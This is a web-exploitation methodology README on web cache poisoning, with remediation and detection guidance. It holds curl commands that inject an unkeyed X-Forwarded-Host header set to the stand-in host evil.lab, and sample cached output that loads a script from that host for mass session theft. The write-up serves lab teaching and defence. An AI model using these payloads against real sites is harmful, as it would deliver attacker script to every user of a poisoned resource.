> **English** | [Italiano](README.md)

# Web cache poisoning

> - **Phase:** Web exploitation - OWASP A05:2021 Security Misconfiguration
> - **Visibility:** Medium - requests with anomalous headers; once the cache is poisoned, the effect hits many users
> - **Prerequisites:** a shared cache (CDN, reverse proxy) in front of an app that reflects in the response an input **not included in the cache key** (unkeyed)
> - **Nature of the document:** methodology + practical payloads for a lab environment. No fabricated Finding ID (next `WEB-016`, to assign in lab).

- Objective: make the shared cache store a manipulated response, so it is served to all subsequent users (mass XSS, redirect, defacement, denial of service).

---

## Executive summary

Web cache poisoning exploits the difference between what the cache uses as a **key** (usually method + URL) and
what the app uses to **generate** the response. If the app reflects an "unkeyed" input (a header like
`X-Forwarded-Host`, `X-Forwarded-Scheme`, or a parameter ignored by the key), the attacker sends a request that
poisons the cache entry: from then on the malicious response is served to anyone requesting that URL. The impact
is collective (all users of the cached resource): typical severity `High`.

## Execution / commands

### Phase 1 - find a reflected unkeyed input

```bash
# Send a candidate header with a marker and use a cache-buster so you do not pollute the real cache
curl -s https://target.lab/?cb=1 -H "X-Forwarded-Host: canary.evil.lab" | grep -i "canary.evil.lab"
# if the marker appears in the response -> the header is reflected and is an unkeyed candidate
```

### Phase 2 - cache poisoning

```bash
# Request that injects a reflected malicious host (e.g., in a <script src> tag or a redirect);
# without a cache-buster, the poisoned response is stored for the shared URL
curl -s https://target.lab/ -H "X-Forwarded-Host: evil.lab"
# subsequent victims receive the response that loads resources from evil.lab -> mass XSS/redirect
```

Illustrative output (in the cached response served to other users):

```
<script src="https://evil.lab/x.js"></script>   <-- host injected via unkeyed header, now cached
X-Cache: HIT                                     <-- the poisoned response comes from the cache
```

Common vectors: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, parameters ignored by the key, duplicate
headers; combinable with CRLF/response splitting.

## Analysis of results

An `X-Cache: HIT` with the injected content confirms the poisoning: the impact is on all users of the resource
(severity `High`, higher if the injection is a session-stealing XSS). If the cache includes in the key all
inputs that influence the response (or the app does not reflect untrusted headers), the vector is closed.

### Theoretical analysis

The root is a **mismatch** between the cache model (key) and the app model (generation): the cache assumes the
same key maps to the same response, but the app varies it on an input not in the key. The countermeasure is to
align the two models: do not reflect untrusted inputs, or include in the key every input that influences the
response (or mark `Cache-Control: no-store` where needed).

## Remediation (blue team)

**Detection.** Anomalous `X-Forwarded-*` headers in requests; cached responses containing unexpected hosts/URLs;
spikes of `X-Cache: HIT` on suspicious content.

**Hardening.** Do not reflect untrusted headers (`X-Forwarded-Host` etc.); include all relevant inputs in the
cache key; normalize/limit accepted headers at the edge; correct `Cache-Control` for personalized content.

---

## Real-world scenario: post-exploitation projection

> Applies to the "cache poisoned with XSS/redirect" outcome (severity High).

**Red team:** poison the home/a common resource with a `<script>` from `evil.lab`; all subsequent users execute
the script, causing mass session theft or redirect. **Blue team:** detect reflected unkeyed headers and HITs on
anomalous content; invalidate the cache; fix the cache key. Lesson: the cache amplifies a single flaw into a
collective impact.

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `Burp Suite` (param miner) | proxy/scanner | web - active | automatic discovery of reflected unkeyed headers/parameters |
| `curl` | http client | cli - active | manual test with candidate headers and a cache-buster |

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | exploitation of the reflection of an unkeyed input on an app behind a shared cache. |
| impact | data manipulation: stored data manipulation | `T1565.001` | caching of a manipulated response served to all users. |

---

## Links to other findings

| source | this technique | effect |
| :--- | :--- | :--- |
| [crlf injection](<../crlf-injection (CRLF Injection)/README.en.md>) | web cache poisoning | response splitting can generate the malicious response that is then cached |
| web cache poisoning | [xss](<../xss (Cross-Site Scripting)/README.en.md>) | the cached injection is often an xss served to everyone |

---

> **Note:** Educational content. Tests must be run only on owned applications or with explicit authorization, in a lab, using cache-busters so as not to impact real users. Illustrative outputs.
